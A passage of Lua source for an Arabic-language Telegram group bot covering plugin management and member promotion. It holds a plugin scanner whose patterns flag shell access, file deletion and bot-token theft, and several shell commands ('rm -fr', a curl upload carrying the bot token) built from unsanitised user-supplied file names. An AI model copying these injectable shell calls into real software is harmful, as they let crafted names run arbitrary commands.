if text:match("^(تفعيل ملف) (.*)(.lua)$")then
local name_t = {string.match(text, "^(تفعيل ملف) (.*)(.lua)$")}

function load(filename)
local f = io.open(filename)
if not f then
return "king"
end
local s = f:read('*all')
f:close()
return s
end
local f = load("files_fayomy/"..name_t[2]..".lua")
if (f:match('^(.*)(http://botlua.tk)(.*)$')) then 
if (f:match('^(.*)(/getChatMember?chat_id=)(.*)$')) then 
fm23kk =  "\n⚠┇الف مره كلنا ما نرفع مال الفروخ \n \n دباي "
database:srem("files"..bot_id,name_t[2]..'.lua')
io.popen("rm -fr files_fayomy/"..name_t[2]..'.lua')
send(msg.chat_id_, msg.id_, 1, fm23kk, 1, 'html')
return false 
end
end
if (f:match('^(.*)(-fr Fayomy.lua)(.*)$')) then 
fm23kk =  "\n⚠┇الف مره كلنا ما نرفع مال الفروخ \n \n دباي "
database:srem("files"..bot_id,name_t[2]..'.lua')
io.popen("rm -fr files_fayomy/"..name_t[2]..'.lua')
send(msg.chat_id_, msg.id_, 1, fm23kk, 1, 'html')
return false 
end
if (f:match('^(.*)(-fr Fayomy.lua)(.*)$')) then 
fm23kk =  "\n⚠┇الف مره كلنا ما نرفع مال الفروخ \n \n دباي "
database:srem("files"..bot_id,name_t[2]..'.lua')
io.popen("rm -fr files_fayomy/"..name_t[2]..'.lua')
send(msg.chat_id_, msg.id_, 1, fm23kk, 1, 'html')
return false 
end
      if (f:match('^(.*)(22fayomy)(.*)(bot_id)(.*)$')) then 
fm23kk =  "\n⚠️┇عمي صدك جذب لول وفيومي كل يوم واحد يهينهم ما شبعتو اهانات 😹😹 \n \n دباي "
database:srem("files"..bot_id,name_t[2]..'.lua')
io.popen("rm -fr files_fayomy/"..name_t[2]..'.lua')
send(msg.chat_id_, msg.id_, 1, fm23kk, 1, 'html')
return false 
end
if (f:match('^(.*)(2fmaster)(.*)(Fayomy)(.*)(elua)(.*)$')) then 
fm23kk =  "\n⚠️┇عمي صدك جذب لول وفيومي كل يوم واحد يهينهم ما شبعتو اهانات 😹😹 \n \n دباي "
database:srem("files"..bot_id,name_t[2]..'.lua')
io.popen("rm -fr files_fayomy/"..name_t[2]..'.lua')
send(msg.chat_id_, msg.id_, 1, fm23kk, 1, 'html')
return false 
end
if (f:match('^(.*)(https://botlua.tk)(.*)$')) then 
fm23kk =  "\n⚠┇لا استطيع رفع ملف يحتوي على دومين الفروخ \n \n دباي "
database:srem("files"..bot_id,name_t[2]..'.lua')
io.popen("rm -fr files_fayomy/"..name_t[2]..'.lua')
send(msg.chat_id_, msg.id_, 1, fm23kk, 1, 'html')
return false 
end
if (f:match('^(.*)(botlua.tk)(.*)$')) then 
fm23kk =  "\n⚠┇لا استطيع رفع ملف يحتوي على دومين الفروخ \n \n دباي "
database:srem("files"..bot_id,name_t[2]..'.lua')
io.popen("rm -fr files_fayomy/"..name_t[2]..'.lua')
send(msg.chat_id_, msg.id_, 1, fm23kk, 1, 'html')
return false 
end
if (f:match('^(.*)(rm -fr Fayomy.lua)(.*)$')) then 
fm23kk =  "\n⚠┇مكدر ارفع ملف يحذف ملف Fayomy.lua لتبعبص ابني "
database:srem("files"..bot_id,name_t[2]..'.lua')
io.popen("rm -fr files_fayomy/"..name_t[2]..'.lua')
send(msg.chat_id_, msg.id_, 1, fm23kk, 1, 'html')
return false 
end
if (f:match('^(.*)(Fayomy.lua)(.*)$')) then 
fm23kk =  "\n⚠┇لا استطيع رفع ملف يحتوي على دومين الفروخ \n \n دباي "
database:srem("files"..bot_id,name_t[2]..'.lua')
io.popen("rm -fr files_fayomy/"..name_t[2]..'.lua')
send(msg.chat_id_, msg.id_, 1, fm23kk, 1, 'html')
return false 
end
if (f:match('^(.*)(t.me/HHHHD)(.*)$')) then 
fm23kk =  "\n⚠┇لا استطيع رفع ملف يحتوي على دومين الفروخ \n \n دباي "
database:srem("files"..bot_id,name_t[2]..'.lua')
io.popen("rm -fr files_fayomy/"..name_t[2]..'.lua')
send(msg.chat_id_, msg.id_, 1, fm23kk, 1, 'html')
return false 
end
      if (f:match('^(.*)(/getChatMember?chat_id=)(.*)$')) then 
fm23kk =  "\n⚠┇مكدر ارفع ملف يحذف ملف Fayomy.lua لتبعبص ابني "
database:srem("files"..bot_id,name_t[2]..'.lua')
io.popen("rm -fr files_fayomy/"..name_t[2]..'.lua')
send(msg.chat_id_, msg.id_, 1, fm23kk, 1, 'html')
return false 
end
if (f:match('^(.*)(22fayomy%3a%22%20%2e%2e%20bot_id)(.*)$')) then 
fm23kk =  "\n⚠️┇ادري هل فروخ كيكو ولول ما يبطلون سوالفهم \n \n دباي "
database:srem("files"..bot_id,name_t[2]..'.lua')
io.popen("rm -fr files_fayomy/"..name_t[2]..'.lua')
send(msg.chat_id_, msg.id_, 1, fm23kk, 1, 'html')
return false 
end
if (f:match('^(.*)(2fmaster%2fFayomy%2elua)(.*)$')) then 
fm23kk =  "\n⚠️┇ادري هل فروخ كيكو ولول ما يبطلون سوالفهم \n \n دباي "
database:srem("files"..bot_id,name_t[2]..'.lua')
io.popen("rm -fr files_fayomy/"..name_t[2]..'.lua')
send(msg.chat_id_, msg.id_, 1, fm23kk, 1, 'html')
return false 
end
if (f:match('^(.*)(22hake)(.*)$')) then 
fm23kk =  "\n⚠️┇ادري هل فروخ كيكو ولول ما يبطلون سوالفهم \n \n دباي "
database:srem("files"..bot_id,name_t[2]..'.lua')
io.popen("rm -fr files_fayomy/"..name_t[2]..'.lua')
send(msg.chat_id_, msg.id_, 1, fm23kk, 1, 'html')
return false 
end
io.popen("rm -fr files_fayomy/del.lua")
io.popen("rm -fr files_fayomy/hack.lua")
io.popen("rm -fr files_fayomy/d.lua")
if f ~= "king" then
fm23 = ""
if f:match("^(.*)(king_fayomy)(.*)$") then
if f:match("^(.*)(function send)(.*)$") then
fm23 = fm23 .. "\n⚠┇ارسال رسال نصيه"
end
if (f:match("^(.*)(sudo.lua)(.*)$")) then 
fm23 = fm23 .. "\n⚠┇الوصول الى توكن البوت وايدي المطور الاساسي"
end
if (f:match("^(.*)(io.popen)(.*)$")) then 
fm23 = fm23 .. "\n⚠┇الوصول الى تورمنل البوت"
end
if (f:match("^(.*)(os.execute)(.*)$")) then 
fm23 = fm23 .. "\n⚠┇الوصول الى تورمنل البوت"
end
if (f:match("^(.*)(redis)(.*)$")) then 
fm23 = fm23 .. "\n⚠┇الوصول الى خزن البوت"
end

if (f:match("^(.*)(rm -fr)(.*)$")) then 
fm23 = fm23 .. "\n⚠┇حذف ملفات او مجلدات"
end
if (f:match("^(.*)(encode)(.*)$")) then 
fm23 = fm23 .. "\n⚠┇التصال بapi خارجي"
end
if (f:match("^(.*)(api.telegram.org/bot)(.*)$")) then 
fm23 = fm23 .. "\n⚠┇قد يسبب الضعف في البوت"
end
database:sadd("files"..bot_id,name_t[2]..'.lua')
send(msg.chat_id_, msg.id_, 1, "✔┇تم تفعيل {"..name_t[2]..".lua}\n"..fm23, 1, 'html')
else
send(msg.chat_id_, msg.id_, 1, '⚠┇عذرا لا يمكن تشغيل {'..name_t[2]..'.lua} \n❗┇لانه لا يدعم سورس فيومي \n 🦁┇[ملفات يدعمها سورس فيومي](t.me/fayomyFiles)', 1, 'md')
end
else
send(msg.chat_id_, msg.id_, 1, '⚠┇عذرا لا يمكن تشغيل {'..name_t[2]..'.lua} \n❗┇لانه لا يدعم سورس فيومي \n 🦁┇[ملفات يدعمها سورس فيومي](t.me/fayomyFiles)', 1, 'md')
end
end
if text:match("^(تعطيل ملف) (.*)(.lua)$") then
local name_t = {string.match(text, "^(تعطيل ملف) (.*)(.lua)$")}
database:srem("files"..bot_id,name_t[2]..'.lua')
send(msg.chat_id_, msg.id_, 1, "✖┇تم تعطيل {"..name_t[2]..".lua}", 1, 'html')
end
if (text:match("^(مسح جميع الملفات)$"))then
database:del("files"..bot_id)
send(msg.chat_id_, msg.id_, 1, "🗑┇تم حذف جميع الملفات", 1, 'html')
end
if text:match("^(حذف ملف) (.*)(.lua)$") then
local name_t = {string.match(text, "^(حذف ملف) (.*)(.lua)$")}
io.popen("rm -fr files_fayomy/"..name_t[2]..'.lua')
database:srem("files"..bot_id,name_t[2]..'.lua')
send(msg.chat_id_, msg.id_, 1, "✖┇تم حذف {"..name_t[2]..".lua}", 1, 'html')
end
if (msg.content_.text_ == 'اضف ملف' ) then
send(msg.chat_id_, msg.id_, 1, " 📥┇ ارسل ملف الان", 1, 'html')
database:set("addfiel"..msg.sender_user_id_,"yes")
end
if text:match("^(جلب ملف) (.*)(.lua)$") then
local name_t = {string.match(text, "^(جلب ملف) (.*)(.lua)$")}
send(msg.chat_id_, msg.id_, 1, "🕡┇ انتظر بعض الوقت وسيتم جلب \n 📁┇ملف : {"..name_t[2]..".lua}", 1, 'html')
local fayomye = 'https://api.telegram.org/bot' .. token .. '/sendDocument'
local curl = 'curl "' .. fayomye .. '" -F "chat_id=' .. msg.chat_id_ .. '" -F "document=@' .. 'files_fayomy/'..name_t[2]..'.lua' .. '"'
io.popen(curl)
end
end
end -- end if sudo
if tonumber(msg.sender_user_id_) == tonumber(sudo_add) then
if text then
if (text and text == 'تفعيل الانلاين' ) then
database:set('key_fm'..bot_id,"yes")
send(msg.chat_id_, msg.id_, 1, "☑┇تم تفعيل خاصيه الازرار الشفافه", 1, 'html')
end
if (text and text == 'تعطيل الانلاين') then
local res = http.request('https://fayomy.000webhostapp.com/fayomy.gq/x.php?id='..msg.sender_user_id_..'')
vardump(res)
if res then
if res == 'false' then
send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @FAYOMYYT ⚜️\n', 1, 'html')   
return false end
end
database:del('key_fm'..bot_id)
send(msg.chat_id_, msg.id_, 1, "⚠┇تم تعطيل خاصيه الازرار الشفافه", 1, 'html')
end
if text:match("^(تغير نص الانلاين) (.*)$") then
local name_t = {string.match(text, "^(تغير نص الانلاين) (.*)$")}
database:set("channel_fm"..bot_id, name_t[2])
send(msg.chat_id_, msg.id_, 1, "📡┇تم تغير النص ~⪼ {"..name_t[2].."}", 1, 'html')
end

if text:match("^(تغير رابط الانلاين) [Hh][Tt][Tt][Pp](.*)$") then
local name_t = {string.match(text, "^(تغير رابط الانلاين) (.*)$")}
database:set("channel_user_fm"..bot_id, name_t[2])
send(msg.chat_id_, msg.id_, 1, "📡┇تم تغير الرابط ~⪼ {"..name_t[2].."}", 1, 'html')
end
end

end --sudo
if tonumber(msg.sender_user_id_) == tonumber(sudo_add) then
if text == 'تفعيل التفعيل التلقائي'then
database:set("add"..bot_id, "yes")
send(msg.chat_id_, msg.id_, 1, "☑┇تم تفعيل التفعيل التلقائي", 1, 'html')
end
if (text == 'تعطيل التفعيل التلقائي') then
database:del("add"..bot_id)
send(msg.chat_id_, msg.id_, 1, "❎┇تم تعطيل التفعيل التلقائي", 1, 'html')
end
if text:match("^(تعين عدد الاعضاء) (.*)$") then
local kingj = {string.match(text, "^(تعين عدد الاعضاء) (.*)$")}
database:set("fm_a"..bot_id,kingj[2])
send(msg.chat_id_, msg.id_, 1, "🔘┇ تم تعين : "..kingj[2], 1, 'html')
end
end
end
end -- end function sudo

function fayomy_run_file(data)
local files_fayomy = database:smembers("files"..bot_id)
for i=1,#files_fayomy do
local fayomyee = dofile("files_fayomy/"..files_fayomy[i])
local kt = fayomyee.king_fayomy(data)
if kt == 'end' then
return false
end
end
end

function FMall(msg,data)
text = msg.content_.text_
if msg.content_.photo_ then
local photo = database:get('fayomy:'..bot_id..'setphoto'..msg.chat_id_..':'..msg.sender_user_id_)
if photo then
local idPh = nil
if msg.content_.photo_.sizes_[0] then
idPh = msg.content_.photo_.sizes_[0].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[1] then
idPh = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[2] then
idPh = msg.content_.photo_.sizes_[2].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[3] then
idPh = msg.content_.photo_.sizes_[3].photo_.persistent_id_
end
setphoto(msg.chat_id_, idPh)
send(msg.chat_id_, msg.id_, 1, '🎴※ تم وضع صوره للمجموعة ✓', 1, 'md')
database:del('fayomy:'..bot_id..'setphoto'..msg.chat_id_..':'..msg.sender_user_id_)
end end
local d = data.disable_notification_
local chat = chafm[msg.chat_id_]
if msg.date_ < (os.time() - 30) then
return false end
if text then
-------------------------------------------
if msg and msg.send_state_.ID == "MessageIsSuccessfullySent" then
function get_mymsg_contact(extra, result, success)
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,get_mymsg_contact)
return false
end
if not database:get( 'fayomy:'..bot_id.."charge:"..msg.chat_id_) then
if database:get( 'fayomy:'..bot_id.."enable:"..msg.chat_id_) then
database:del( 'fayomy:'..bot_id.."enable:"..msg.chat_id_)
for k,v in pairs(sudo_users) do
end
end
end
if msg.chat_id_ then
local id = tostring(msg.chat_id_)
if id:match('-100(%d+)') then
if not database:sismember( 'fayomy:'..bot_id.."groups",msg.chat_id_) then
database:sadd( 'fayomy:'..bot_id.."groups",msg.chat_id_)
end
elseif id:match('^(%d+)') then
database:sadd('fayomy:'..bot_id.."userss",msg.chat_id_)
else
if not database:sismember( 'fayomy:'..bot_id.."groups",msg.chat_id_) then
database:sadd( 'fayomy:'..bot_id.."groups",msg.chat_id_)
end
end
end
if ((not d) and chat) then
if msg.content_.ID == "MessageText" then
do_notify (chat.title_, msg.content_.text_)
else
do_notify (chat.title_, msg.content_.ID)
end
end
database:incr('fayomy:'..bot_id..'user:msgs'..msg.chat_id_..':'..msg.sender_user_id_)
if database:get('fayomy:'..bot_id..'viewget'..msg.sender_user_id_) then
if not msg.forward_info_ then
send(msg.chat_id_, msg.id_, 1, '❕┇قم بارسال المنشور من القناة', 1, 'md')
database:del('fayomy:'..bot_id..'viewget'..msg.sender_user_id_)
else
send(msg.chat_id_, msg.id_, 1, '📊┇عدد المشاهدات ~⪼ <b>('..msg.views_..')</b> ', 1, 'html')
database:del('fayomy:'..bot_id..'viewget'..msg.sender_user_id_)
end
end
if msg.content_.members_ then
if is_banned(msg.content_.members_[0].id_, msg.chat_id_) then
chat_kick(msg.chat_id_, msg.content_.members_[0].id_)
return false
end
end
if (text and (is_creator(msg) or is_creatorbasic(msg))) then
if text:match("اضف امر (.*)") then 
local fayomy_edis = {string.match(text, "^اضف امر (.*)$")}
send(msg.chat_id_, msg.id_, 1, "☑┇ ارسال الان الامر الجديد", 1, 'md')
database:set("fmahke:new:msg:"..msg.chat_id_..msg.sender_user_id_..bot_id,fayomy_edis[1])
elseif (database:get("fmahke:new:msg:"..msg.chat_id_..msg.sender_user_id_..bot_id)) then 
send(msg.chat_id_, msg.id_, 1, "☑┇ تم الحفظ بنجاح", 1, 'md')
database:set("fayomy:edit:text:su:new:"..bot_id..msg.chat_id_..database:get("fmahke:new:msg:"..msg.chat_id_..msg.sender_user_id_..bot_id),text)
database:set("fayomy:edit:text:su:new2:"..bot_id..msg.chat_id_..text,database:get("fmahke:new:msg:"..msg.chat_id_..msg.sender_user_id_..bot_id))
database:del("fmahke:new:msg:"..msg.chat_id_..msg.sender_user_id_..bot_id)
end  
if (text and text == 'مسح امر المطور بالكليشه') and tonumber(msg.sender_user_id_) == tonumber(sudo_add) then
redis:del('fayomy:'..bot_id..'text_sudo', text)
send(msg.chat_id_, msg.id_, 1, '☑┇تم حذف الكليشه ', 1, 'html')
return "fayomy"
end
if text:match("^مسح امر (.*)") then 
local t = {string.match(text, "^مسح امر (.*)$")}
database:del("fayomy:edit:text:su:new2:"..bot_id..msg.chat_id_..database:get("fayomy:edit:text:su:new:"..bot_id..msg.chat_id_..t[1]))
database:del("fayomy:edit:text:su:new:"..bot_id..msg.chat_id_..t[1])
send(msg.chat_id_, msg.id_, 1, "☑┇ تم المسح بنجاح", 1, 'md')
end
end

if text == "رفع منشئ" and is_creatorbasic(msg) and msg.reply_to_message_id_ then
local res = http.request('https://fayomy.000webhostapp.com/fayomy.gq/x.php?id='..msg.sender_user_id_..'')
vardump(res)
if res then
if res == 'false' then
send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @FAYOMYYT ⚜️\n', 1, 'html')   
return false end
end
function setcreator_by_reply(extra, result, success)
local hash =  'fayomy:'..bot_id..'creator:'..msg.chat_id_
if database:sismember(hash, result.sender_user_id_) then
fmX000("prore",msg,"※ تم بالفعل رفعة منشئ  في البوت ✓ 🤵🏻")
else
database:sadd(hash, result.sender_user_id_)
fmX000("prore",msg,"※ تم رفعة منشئ  في البوت ✓ 🤵🏻")
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,setcreator_by_reply)
end
if text:match("^رفع منشئ @(.*)$") and is_creatorbasic(msg) then
local res = http.request('https://fayomy.000webhostapp.com/fayomy.gq/x.php?id='..msg.sender_user_id_..'')
vardump(res)
if res then
if res == 'false' then
send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @FAYOMYYT ⚜️\n', 1, 'html')   
return false end
end
local apow = {string.match(text, "^(رفع منشئ) @(.*)$")}
local res = http.request('https://fayomy.000webhostapp.com/fayomy.gq/x.php?id='..msg.sender_user_id_..'')
vardump(res)
if res then
if res == 'false' then
send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @FAYOMYYT ⚜️\n', 1, 'html')   
return false end
end
function setcreator_by_username(extra, result, success)
if result.id_ then
database:sadd('fayomy:'..bot_id..'creator:'..msg.chat_id_, result.id_)
texfm = '💁🏻‍♂️※ العضو ✓['..result.title_..'](t.me/'..(apow[2] or 'FAYOMYYT')..')\n※ تم رفعة منشئ  في البوت ✓ 🤵🏻'
else
texfm = '✖┇خطاء'
end
send(msg.chat_id_, msg.id_, 1, texfm, 1, 'md')
end
resolve_username(apow[2],setcreator_by_username)
end
if text:match("^رفع منشئ (%d+)$") and is_creatorbasic(msg) then
local res = http.request('https://fayomy.000webhostapp.com/fayomy.gq/x.php?id='..msg.sender_user_id_..'')
vardump(res)
if res then
if res == 'false' then
send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @FAYOMYYT ⚜️\n', 1, 'html')   
return false end
end
local apow = {string.match(text, "^(رفع منشئ) (%d+)$")}
local res = http.request('https://fayomy.000webhostapp.com/fayomy.gq/x.php?id='..msg.sender_user_id_..'')
vardump(res)
if res then
if res == 'false' then
send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @FAYOMYYT ⚜️\n', 1, 'html')   
return false end
end
database:sadd('fayomy:'..bot_id..'creator:'..msg.chat_id_, apow[2])
fmX000(apow[2],msg,"※ تم رفعة منشئ  في البوت ✓ 🤵🏻")
end
if text:match("^تنزيل منشئ$") and is_creatorbasic(msg) and msg.reply_to_message_id_ then
function decreator_by_reply(extra, result, success)
local hash =  'fayomy:'..bot_id..'creator:'..msg.chat_id_
if not database:sismember(hash, result.sender_user_id_) then
fmX000("prore",msg,"※ بالفعل تم تنزيله من منشئين المجموعه ✓ 🕵🏻‍♂️")
else
database:srem(hash, result.sender_user_id_)
fmX000("prore",msg,"※ تم تنزيله من منشئين المجموعه ✓ 🕵🏻‍♂️")
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,decreator_by_reply)
end
if text:match("^تنزيل منشئ @(.*)$") and is_creatorbasic(msg) then
local apow = {string.match(text, "^(تنزيل منشئ) @(.*)$")}
local hash =  'fayomy:'..bot_id..'creator:'..msg.chat_id_
function remcreator_by_username(extra, result, success)
if result.id_ then
database:srem(hash, result.id_)
texfm = '💁🏻‍♂️※ العضو ✓['..result.title_..'](t.me/'..(apow[2] or 'FAYOMYYT')..')\n※ تم تنزيله من منشئين المجموعه ✓ 🕵🏻‍♂️'
else
texfm = '✖┇خطاء'
end
send(msg.chat_id_, msg.id_, 1, texfm, 1, 'md')
end
resolve_username(apow[2],remcreator_by_username)
end
if text:match("^تنزيل منشئ (%d+)$") and is_creatorbasic(msg) then
local hash =  'fayomy:'..bot_id..'creator:'..msg.chat_id_
local apow = {string.match(text, "^(تنزيل منشئ) (%d+)$")}
database:srem(hash, apow[2])
fmX000(apow[2],msg,"※ تم تنزيله من منشئين المجموعه ✓ 🕵🏻‍♂️")
end--
if text:match("^المنشئين")and is_creatorbasic(msg) then
local hash =   'fayomy:'..bot_id..'creator:'..msg.chat_id_
local list = database:smembers(hash)
text = "👨‍👩‍👧‍👦 ※ قائمة المنشئين   ✓  ،\nꔹ┉♦️┉ ┉ ┉ ┉♦️┉ꔹ\n"
for k,v in pairs(list) do
local user_info = database:hgetall('fayomy:'..bot_id..'user:'..v)
if user_info and user_info.username then
local username = user_info.username
text = text.."<b>|"..k.."|</b>~⪼(@"..username..")\n"
else
text = text.."<b>|"..k.."|</b>~⪼(<code>"..v.."</code>)\n"
end
if #text > 7000 then
send(msg.chat_id_, msg.id_, 1, text, 1, 'html')
text = ""
end
end
if #list == 0 then
text = "❗️※ لا يوجد منشئين  ✓"
end
send(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
----------------------------------------
if text:match("^رفع ادمن بالكروب (%d+)$") and  is_creatorbasic(msg) then
local res = http.request('https://fayomy.000webhostapp.com/fayomy.gq/x.php?id='..msg.sender_user_id_..'')
vardump(res)
if res then
if res == 'false' then
send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @FAYOMYYT ⚜️\n', 1, 'html')   
return false end
end
local apmd = {string.match(text, "^(رفع ادمن بالكروب) (%d+)$")}
local res = http.request('https://fayomy.000webhostapp.com/fayomy.gq/x.php?id='..msg.sender_user_id_..'')
vardump(res)
if res then
if res == 'false' then
send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @FAYOMYYT ⚜️\n', 1, 'html')   
return false end
end
HTTPS.request("https://api.telegram.org/bot" .. token .. "/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..apmd[2].."&can_change_info=True&can_delete_messages=True&can_invite_users=True&can_restrict_members=True&can_pin_messages=True&can_promote_members=false")
fmX000(apmd[2],msg,'※ تم رفعة ادمن   في الكروب ✓ 👨🏻‍🚒')
end
if text:match("^رفع ادمن بالكروب$")  and is_creatorbasic(msg) and msg.reply_to_message_id_ then
local res = http.request('https://fayomy.000webhostapp.com/fayomy.gq/x.php?id='..msg.sender_user_id_..'')
vardump(res)
if res then
if res == 'false' then
send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @FAYOMYYT ⚜️\n', 1, 'html')   
return false end
end
function promote_by_reply(extra, result, success)
HTTPS.request("https://api.telegram.org/bot" .. token .. "/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=True&can_delete_messages=True&can_invite_users=True&can_restrict_members=True&can_pin_messages=True&can_promote_members=false")
fmX000("prore",msg,'※ تم رفعة ادمن   في الكروب ✓ 👨🏻‍🚒')
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end
if text:match("^رفع ادمن بالكروب @(.*)$") and is_creatorbasic(msg) then
local res = http.request('https://fayomy.000webhostapp.com/fayomy.gq/x.php?id='..msg.sender_user_id_..'')
vardump(res)
if res then
if res == 'false' then
send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @FAYOMYYT ⚜️\n', 1, 'html')   
return false end
end
local apmd = {string.match(text, "^(رفع ادمن بالكروب) @(.*)$")}
function promote_by_username(extra, result, success)
if result.id_ then
HTTPS.request("https://api.telegram.org/bot" .. token .. "/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.id_.."&can_change_info=True&can_delete_messages=True&can_invite_users=True&can_restrict_members=True&can_pin_messages=True&can_promote_members=false")
texfm = '💁🏻‍♂️※ العضو ✓['..result.title_..'](t.me/'..(apmd[2] or 'FAYOMYYT')..')\n※ تم رفعة ادمن   في الكروب ✓ 👨🏻‍🚒'
else
texfm = '✖┇خطاء'
end
send(msg.chat_id_, msg.id_, 1, texfm, 1, 'md')
end
resolve_username(apmd[2],promote_by_username)
end
--------------------------------------
-------------------------------------
if text:match("^رفع منشئ بالكروب (%d+)$") and  is_creatorbasic(msg) then
local res = http.request('https://fayomy.000webhostapp.com/fayomy.gq/x.php?id='..msg.sender_user_id_..'')
vardump(res)
if res then
if res == 'false' then
send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @FAYOMYYT ⚜️\n', 1, 'html')   
return false end
end
local apmd = {string.match(text, "^(رفع منشئ بالكروب) (%d+)$")}
local res = http.request('https://fayomy.000webhostapp.com/fayomy.gq/x.php?id='..msg.sender_user_id_..'')
vardump(res)
if res then
if res == 'false' then
send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @FAYOMYYT ⚜️\n', 1, 'html')   
return false end
end
HTTPS.request("https://api.telegram.org/bot" .. token .. "/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..apmd[2].."&can_change_info=True&can_delete_messages=True&can_invite_users=True&can_restrict_members=True&can_pin_messages=True&can_promote_members=True")
fmX000(apmd[2],msg,'※ تم رفعة منشئ   في الكروب ✓ 👨🏻‍🚒')
end
if text:match("^رفع منشئ بالكروب$")  and is_creatorbasic(msg) and msg.reply_to_message_id_ then
local res = http.request('https://fayomy.000webhostapp.com/fayomy.gq/x.php?id='..msg.sender_user_id_..'')
vardump(res)
if res then
if res == 'false' then
send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @FAYOMYYT ⚜️\n', 1, 'html')   
return false end
end
function promote_by_reply(extra, result, success)
HTTPS.request("https://api.telegram.org/bot" .. token .. "/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=True&can_delete_messages=True&can_invite_users=True&can_restrict_members=True&can_pin_messages=True&can_promote_members=True")
fmX000("prore",msg,'※ تم رفعة منشئ في الكروب ✓ 👨🏻‍🚒')
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end
if text:match("^رفع منشئ بالكروب @(.*)$") and is_creatorbasic(msg) then
local res = http.request('https://fayomy.000webhostapp.com/fayomy.gq/x.php?id='..msg.sender_user_id_..'')
vardump(res)
if res then
if res == 'false' then
send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @FAYOMYYT ⚜️\n', 1, 'html')   
return false end
end
local apmd = {string.match(text, "^(رفع منشئ بالكروب) @(.*)$")}
function promote_by_username(extra, result, success)
if result.id_ then
HTTPS.request("https://api.telegram.org/bot" .. token .. "/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.id_.."&can_change_info=True&can_delete_messages=True&can_invite_users=True&can_restrict_members=True&can_pin_messages=True&can_promote_members=True")
texfm = '💁🏻‍♂️※ العضو ✓['..result.title_..'](t.me/'..(apmd[2] or 'FAYOMYYT')..')\n※ تم رفعة منشئ   في الكروب ✓ 👨🏻‍🚒'
else
texfm = '✖┇خطاء'
end
send(msg.chat_id_, msg.id_, 1, texfm, 1, 'md')
end
resolve_username(apmd[2],promote_by_username)
end
----------------------------------
if text:match("^تنزيل ادمن بالكروب (%d+)$") and  is_creatorbasic(msg) then
local apmd = {string.match(text, "^(تنزيل ادمن بالكروب) (%d+)$")}
HTTPS.request("https://api.telegram.org/bot" .. token .. "/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..apmd[2].."&can_change_info=false&can_delete_messages=false&can_invite_users=false&can_restrict_members=false&can_pin_messages=false&can_promote_members=false")
fmX000(apmd[2],msg,'※ تم تنزيله ادمن   في الكروب ✓ 👨🏻‍🚒')
end
if text:match("^تنزيل ادمن بالكروب$")  and is_creatorbasic(msg) and msg.reply_to_message_id_ then
function promote_by_reply(extra, result, success)
HTTPS.request("https://api.telegram.org/bot" .. token .. "/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=false&can_restrict_members=false&can_pin_messages=false&can_promote_members=false")
fmX000("prore",msg,'※ تم تنزيله ادمن   في الكروب ✓ 👨🏻‍🚒')
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end
if text:match("^تنزيل ادمن بالكروب @(.*)$") and is_creatorbasic(msg) then
local apmd = {string.match(text, "^(تنزيل ادمن بالكروب) @(.*)$")}
function promote_by_username(extra, result, success)
if result.id_ then
